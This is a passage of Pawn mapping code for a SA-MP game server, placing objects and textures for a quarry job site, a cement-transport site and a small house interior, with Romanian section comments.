	CreateObject(6299, 1709.85510, -1791.92151, 14.55620,   0.00000, 0.00000, 180.00000);
	CreateObject(19355, 1809.97095, -1798.68701, 12.47870,   0.00000, 90.00000, 0.00000);
	CreateObject(19355, 1806.48425, -1798.68701, 12.47870,   0.00000, 90.00000, 0.00000);
	CreateObject(19355, 1802.98206, -1798.68701, 12.47870,   0.00000, 90.00000, 0.00000);
	CreateObject(19355, 1809.97095, -1801.89185, 12.47870,   0.00000, 90.00000, 0.00000);
	CreateObject(19355, 1806.48425, -1801.89185, 12.47870,   0.00000, 90.00000, 0.00000);
	CreateObject(19355, 1802.98206, -1801.89185, 12.47870,   0.00000, 90.00000, 0.00000);
	CreateObject(18014, 1808.86475, -1796.51318, 12.97270,   0.00000, 0.00000, 90.00000);
	CreateObject(8990, 1756.82178, -1812.72546, 13.24750,   0.00000, 0.00000, -14.00000);
	CreateObject(8990, 1743.43286, -1809.15308, 13.24750,   0.00000, 0.00000, -14.00000);
	CreateObject(19355, 1737.59302, -1807.01074, 12.47870,   0.00000, 0.00000, -105.00000);
	CreateObject(19355, 1741.57300, -1808.10132, 12.47870,   0.00000, 0.00000, -105.00000);
	CreateObject(19355, 1745.64807, -1809.15454, 12.47870,   0.00000, 0.00000, -105.00000);
	CreateObject(19355, 1750.21753, -1810.32031, 12.47870,   0.00000, 0.00000, -105.00000);
	CreateObject(19355, 1754.54639, -1811.53284, 12.47870,   0.00000, 0.00000, -105.00000);
	CreateObject(19355, 1758.50989, -1812.60571, 12.47870,   0.00000, 0.00000, -105.00000);
	CreateObject(19355, 1762.85486, -1813.80737, 12.47870,   0.00000, 0.00000, -105.00000);
	CreateObject(1281, 1748.61914, -1805.16223, 13.32840,   0.00000, 0.00000, -14.00000);
	CreateObject(1281, 1756.22937, -1806.64563, 13.32840,   0.00000, 0.00000, -14.00000);
	CreateObject(1281, 1763.56738, -1807.36121, 13.32840,   0.00000, 0.00000, -14.00000);
	CreateObject(1281, 1777.35706, -1785.42297, 13.32840,   0.00000, 0.00000, 0.00000);
	CreateObject(618, 1760.55615, -1813.91699, 13.33661,   0.00000, 0.00000, 0.00000);
	CreateObject(618, 1756.96033, -1812.28394, 13.33660,   0.00000, 0.00000, 90.00000);
	CreateObject(618, 1748.31726, -1809.66528, 13.33660,   0.00000, 0.00000, 90.00000);
	CreateObject(618, 1739.78674, -1806.94189, 13.33660,   0.00000, 0.00000, 134.00000);
	CreateObject(618, 1743.90454, -1808.04883, 13.33660,   0.00000, 0.00000, 134.00000);
	CreateObject(618, 1752.70422, -1810.79517, 13.33660,   0.00000, 0.00000, 134.00000);
	CreateObject(8990, 1730.95081, -1749.65430, 13.24750,   0.00000, 0.00000, 90.00000);
	CreateObject(8990, 1730.48169, -1761.16345, 13.24750,   0.00000, 0.00000, -90.00000);
	CreateObject(8990, 1730.45203, -1775.06519, 13.24750,   0.00000, 0.00000, -90.00000);
	//================================= Muncitor in Cariera ==========================================//
	new GRADILPOD1 = CreateObject(19530,1923.4020, -1394.4960, 12.1224,0.0000, 0.0000, 0.0000,2000.00);
	SetObjectMaterial(GRADILPOD1,0, 16055, "des_quarry", "des_dirt2track");
	new GRADILPOD2 = CreateObject(19545,1892.7870, -1380.7581, 12.1260,0.0000, 0.0000, 90.0000,2000.00);
	SetObjectMaterial(GRADILPOD2,0, 17513, "landlae2e", "dirtKB_64HV");
	new GRADILPOD3 = CreateObject(19545,1955.2930, -1380.7581, 12.1260,0.0000, 0.0000, 90.0000,2000.00);
	SetObjectMaterial(GRADILPOD3,0, 17513, "landlae2e", "dirtKB_64HV");
	new GRADILPOD4 = CreateObject(19545,1983.6530, -1365.7740, 12.1260,0.0000, 0.0000, 90.0000,2000.00);
	SetObjectMaterial(GRADILPOD4,0, 17513, "landlae2e", "dirtKB_64HV");
	new GRADILPOD5 = CreateObject(19545,1983.6530, -1350.7900, 12.1260,0.0000, 0.0000, 90.0000,2000.00);
	SetObjectMaterial(GRADILPOD5,0, 17513, "landlae2e", "dirtKB_64HV");
	new GRADZIDOVI[7];
	GRADZIDOVI[0] = CreateObject(18981,1976.9509, -1364.1392, 10.1129,0.0000, 0.0000, 0.0000,2000.00);
	SetObjectMaterial(GRADZIDOVI[0],0, 12959, "sw_library", "studwalltop_law");
	GRADZIDOVI[1] = CreateObject(18981,1976.9529, -1387.4299, 8.7689,7.5040, 0.0000, 0.0000,2000.00);
	SetObjectMaterial(GRADZIDOVI[1],0, 12959, "sw_library", "studwalltop_law");
	GRADZIDOVI[2] = CreateObject(18981,1976.9673, -1411.4401, 5.0249,10.0000, 0.0000, 0.0000,2000.00);
	SetObjectMaterial(GRADZIDOVI[2],0, 12959, "sw_library", "studwalltop_law");
	GRADZIDOVI[3] = CreateObject(18981,1976.9882, -1436.1152, 1.0729,10.0000, 0.0000, 0.0000,2000.00);
	SetObjectMaterial(GRADZIDOVI[3],0, 12959, "sw_library", "studwalltop_law");
	GRADZIDOVI[4] = CreateObject(18981,1974.8042, -1351.3472, 10.1129,0.0000, 0.0000, 90.0000,2000.00);
	SetObjectMaterial(GRADZIDOVI[4],0, 12959, "sw_library", "studwalltop_law");
	GRADZIDOVI[5] = CreateObject(18981,1952.3022, -1351.3431, 8.0509,-10.4800, 0.0000, 90.0000,2000.00);
	SetObjectMaterial(GRADZIDOVI[5],0, 12959, "sw_library", "studwalltop_law");
	GRADZIDOVI[6] = CreateObject(18981,1927.7582, -1351.3411, 3.5149,-10.4800, 0.0000, 90.0000,2000.00);
	SetObjectMaterial(GRADZIDOVI[6],0, 12959, "sw_library", "studwalltop_law");
	CreateObject(5415,1916.9395, -1400.8966, 16.4705,0.0000, 0.0000, 0.0000,2000.00);
	CreateObject(3866, 1962.13440, -1439.52783, 19.71090,   0.00000, 0.00000, 180.00000,2000.00);
	CreateObject(3887, 1889.89624, -1360.20593, 19.77350,   0.00000, 0.00000, -90.00000,2000.00);
	CreateObject(5463, 1880.44604, -1429.97034, 36.08420,   0.00000, 0.00000, 0.00000,2000.00);
	CreateObject(1383, 1967.40918, -1442.67139, 43.96060,   0.00000, 0.00000, 0.00000,2000.00);
	CreateObject(1384, 1967.58594, -1442.59509, 76.11250,   0.00000, 0.00000, 32.00000,2000.00);
	CreateDynamicObject(1684, 1967.43945, -1353.84631, 13.61740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1684, 1957.44055, -1353.84631, 13.61740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3865, 1930.15198, -1447.40039, 13.58940,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3865, 1930.15198, -1442.78137, 13.58940,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3865, 1918.23206, -1442.78137, 13.58940,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3865, 1918.23206, -1447.25134, 13.58940,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3865, 1918.23206, -1445.01636, 16.12240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3865, 1930.15198, -1445.01636, 16.12240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1358, 1863.65820, -1394.17139, 13.30660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1358, 1863.65820, -1401.32336, 13.30660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1358, 1863.65820, -1408.32642, 13.30660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1685, 1974.54346, -1378.45044, 12.83770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 1974.54346, -1382.05042, 12.83770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 1974.54346, -1386.01038, 12.83770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1684, 1969.23950, -1425.84631, 13.61740,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(970, 1952.46838, -1358.67664, 12.66450,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1952.46838, -1362.82458, 12.66450,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1952.46838, -1366.97266, 12.66450,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1952.46838, -1371.12061, 12.66450,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1952.46838, -1354.56262, 12.66450,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18981, 1861.96545, -1403.31055, 0.02330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18981, 1861.96545, -1428.17456, 0.02330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18981, 1861.96741, -1438.42261, 0.02330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18981, 1874.79443, -1450.83154, 0.02330,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18981, 1899.69934, -1450.83154, 0.02330,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18981, 1924.60437, -1450.83154, 0.02330,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18981, 1949.50940, -1450.83154, 0.02330,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18981, 1859.76355, -1378.32056, 0.19930,   0.00000, 11.16200, 0.00000);
	CreateDynamicObject(18981, 1860.54749, -1378.32056, 0.03930,   0.00000, 12.06600, 0.00000);
	//CreateDynamicObject(976, 1861.89209, -1384.95410, 12.55810,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19463, 1861.92725, -1389.85291, 14.00040,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19463, 1861.84216, -1371.32288, 14.00040,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3259, 1942.85437, -1443.79822, 11.85270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16400, 1976.57666, -1361.94104, 12.10790,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 1974.54346, -1374.20044, 12.83770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 1972.41846, -1376.15540, 12.83770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 1972.41846, -1380.40540, 12.83770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 1972.41846, -1383.97534, 12.83770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18248, 1912.06116, -1448.73926, 20.86150,   0.00000, 0.00000, 85.00000);
	CreateDynamicObject(3864, 1970.45593, -1372.76184, 18.34800,   0.00000, 0.00000, -62.00000);
	CreateDynamicObject(3864, 1949.98206, -1355.11182, 18.34800,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(3864, 1919.62402, -1355.11182, 18.47400,   0.00000, 0.00000, 1200.00000);
	CreateDynamicObject(3864, 1972.92688, -1390.76477, 18.34800,   0.00000, 0.00000, 33.00000);
	//=============================TRANSPORTATOR DE CIMENT =================================//
	new gradilistesazidovi[13];
	gradilistesazidovi[0] = CreateDynamicObject(19379, 2418.46655, 1904.51611, 9.46830,   0.00000, 0.00000, 90.00000);
	gradilistesazidovi[1] = CreateDynamicObject(19379, 2427.65771, 1904.51416, 9.46830,   0.00000, 0.00000, 90.00000);
	gradilistesazidovi[2] = CreateDynamicObject(19379, 2412.56250, 1909.77209, 9.46830,   0.00000, 0.00000, -0.06000);
	gradilistesazidovi[3] = CreateDynamicObject(19379, 2412.56055, 1918.62805, 9.46830,   0.00000, 0.00000, 0.00000);

    gradilistesazidovi[4] = CreateDynamicObject(19462, 2432.50684, 1918.98926, 10.22700,   0.00000, 0.00000, 0.00000);
	gradilistesazidovi[5] = CreateDynamicObject(19462, 2432.50684, 1909.35132, 10.22700,   0.00000, 0.00000, 0.00000);
	gradilistesazidovi[6] = CreateDynamicObject(19462, 2432.50684, 1907.26331, 3.66300,   90.00000, 0.00000, 0.00000);
	gradilistesazidovi[7] = CreateDynamicObject(19462, 2432.50684, 1921.54333, 3.66300,   90.00000, 0.00000, 0.00000);

	gradilistesazidovi[8] = CreateDynamicObject(19416, 2432.49878, 1910.57813, 6.75630,   0.00000, 0.00000, 0.00000);
	gradilistesazidovi[9] = CreateDynamicObject(19416, 2432.49878, 1918.19409, 6.75630,   0.00000, 0.00000, 0.00000);
	gradilistesazidovi[10] = CreateDynamicObject(19416, 2424.64038, 1924.44629, 6.75630,   0.00000, 0.00000, 90.00000);
	gradilistesazidovi[11] = CreateDynamicObject(19416, 2429.80835, 1924.44629, 6.75630,   0.00000, 0.00000, 90.00000);

	gradilistesazidovi[12] = CreateDynamicObject(19355, 2427.27100, 1924.44434, 6.74570,   0.00000, 0.00000, 90.00000);

	SetDynamicObjectMaterial(gradilistesazidovi[0], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[1], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[2], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[3], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[4], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[5], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[6], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[7], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[8], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[9], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[10], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[11], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);
	SetDynamicObjectMaterial(gradilistesazidovi[12], 0, 3355, "cxref_savhus", "des_brick1", 0xFFFFFFFF);

	CreateDynamicObject(19865, 2432.58740, 1938.15479, 3.91080,   0.00000, 0.00000, 0.06000);
	CreateDynamicObject(19865, 2432.58740, 1927.07886, 3.91080,   0.00000, 0.00000, 0.06000);
	CreateDynamicObject(19865, 2430.17334, 1940.62280, 3.91080,   0.00000, 0.00000, 90.06000);
	CreateDynamicObject(3048, 2424.77954, 1935.63586, 4.97700,   0.00000, 0.00000, -178.00000);
	CreateDynamicObject(3048, 2424.77954, 1929.39587, 4.87300,   0.00000, 0.00000, 4.00000);
	
	CreateDynamicObject(1391, 2455.16309, 1913.39502, 42.44700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1384, 2455.20996, 1913.53198, 54.91110,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(16337, 2449.85327, 1923.94775, 9.98550,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3530, 2432.03589, 1904.88855, 10.38640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3530, 2413.07275, 1904.88855, 10.38640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3530, 2413.07275, 1923.86255, 10.38640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3530, 2432.03589, 1923.86255, 10.38640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2452.40308, 1918.88562, 10.55320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2454.66528, 1918.88562, 10.55320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2457.10107, 1918.88562, 10.55320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2457.10107, 1924.45361, 10.55320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2454.66528, 1924.45361, 10.55320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2452.40308, 1924.45361, 10.55320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1684, 2454.23438, 1906.90186, 11.36940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3504, 2460.00366, 1910.53491, 11.15960,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3504, 2460.00366, 1913.54395, 11.15960,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3504, 2460.00366, 1916.49390, 11.15960,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3502, 2397.82837, 1932.90283, 6.83400,   0.00000, 0.00000, 100.00000);
	CreateDynamicObject(3502, 2397.82837, 1927.39478, 6.83400,   0.00000, 0.00000, 88.00000);
	CreateDynamicObject(3502, 2397.82837, 1921.23877, 6.83400,   0.00000, 0.00000, 86.00000);
	CreateDynamicObject(3502, 2397.82837, 1914.59680, 6.83400,   0.00000, 0.00000, 102.00000);
	CreateDynamicObject(11293, 2399.18481, 1958.91943, 15.63410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11290, 2395.78345, 1846.70996, 16.33400,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3887, 2386.38794, 1925.89355, 18.77830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3259, 2426.75610, 1956.54846, 4.99260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3643, 2422.13989, 1953.21033, 10.65040,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3257, 2400.02441, 1880.98975, 4.99570,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(16076, 2419.22852, 1942.93958, 8.67120,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18248, 2475.97412, 1926.17603, 17.54470,   -2.40460, 0.00000, -26.00000);
	CreateDynamicObject(16304, 2452.08594, 1950.31641, 12.12640,   0.00000, 0.00000, 91.00000);
	CreateDynamicObject(16304, 2481.65283, 1947.47827, 14.11740,   0.00000, 0.00000, 91.00000);
	CreateDynamicObject(3530, 2422.41382, 1923.86255, 10.38640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2421.25439, 1932.18115, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2421.25439, 1937.09509, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2421.25439, 1927.40015, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2418.12524, 1929.78406, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2418.12524, 1934.55212, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3864, 2415.83252, 1907.17456, 10.95430,   0.00000, 0.00000, -149.00000);
	CreateDynamicObject(3864, 2429.54053, 1921.18054, 10.95430,   0.00000, 0.00000, 62.00000);
	CreateDynamicObject(1469, 2413.48877, 1912.14148, 6.33020,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1469, 2413.48877, 1914.82349, 6.33020,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1469, 2413.48877, 1917.50549, 6.33020,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1469, 2413.48877, 1920.18750, 6.33020,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1426, 2429.36987, 1905.74158, 4.99410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1426, 2426.09180, 1905.74158, 4.99410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1426, 2422.81372, 1905.74158, 4.99410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2421.90283, 1918.10693, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2424.77368, 1915.06470, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2421.67603, 1911.86951, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1685, 2426.54443, 1910.16992, 5.70840,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1428, 2426.97974, 1923.90674, 6.48610,   0.00000, 0.00000, 0.00000);
	//-----------------------------------|| Interior CASA MIC ||----------------------------------------------
	new nebeskaudica;
	nebeskaudica = CreateDynamicObject(2255, 224.20129, 1749.74976, 3338.55249,   0.00000, 0.00000, 180.00000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14581, "ab_mafiasuitea", "barbersmir1", 0x00000000);
	nebeskaudica = CreateDynamicObject(2255, 223.36130, 1749.74976, 3338.55249,   0.00000, 0.00000, 180.00000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14581, "ab_mafiasuitea", "barbersmir1", 0x00000000);
	nebeskaudica = CreateDynamicObject(2255, 222.52130, 1749.74976, 3338.55249,   0.00000, 0.00000, 180.00000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14581, "ab_mafiasuitea", "barbersmir1", 0x00000000);
	//
	nebeskaudica = CreateDynamicObjectEx(19378,207.059,1752.065,3333.157,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	nebeskaudica = CreateDynamicObjectEx(19377,209.429,1758.048,3337.354,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,211.827,1753.258,3337.354,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19378,213.570,1757.918,3332.625,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	nebeskaudica = CreateDynamicObjectEx(19378,207.750,1752.543,3332.884,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	nebeskaudica = CreateDynamicObjectEx(19377,208.188,1757.297,3327.702,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,207.498,1756.808,3327.988,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,223.881,1758.077,3330.876,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,214.051,1762.531,3337.354,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2678,212.358,1762.228,3332.981,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,217.411,1760.851,3337.091,0.000,47.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19378,222.712,1757.847,3337.024,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	nebeskaudica = CreateDynamicObjectEx(18762,217.903,1760.109,3336.607,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,217.902,1755.506,3336.607,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19377,225.109,1757.813,3344.866,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19379,222.697,1758.115,3336.187,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 11301, "carshow_sfse", "ws_officy_ceiling", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19378,224.058,1757.917,3332.625,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
	nebeskaudica = CreateDynamicObjectEx(1569,211.367,1753.298,3333.207,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 4829, "airport_las", "liftdoorsac256", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(19377,223.638,1762.516,3331.071,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,221.168,1753.253,3331.199,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,212.932,1752.545,3327.702,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,212.237,1752.067,3327.988,0.000,0.000,180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(18762,217.919,1752.876,3334.329,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,217.916,1753.764,3332.218,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,217.912,1756.104,3334.329,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,217.917,1753.588,3336.425,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,217.481,1762.416,3337.091,0.000,47.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,212.591,1762.203,3333.207,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,212.834,1762.205,3333.409,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,213.140,1762.140,3333.634,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,213.343,1762.159,3333.905,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
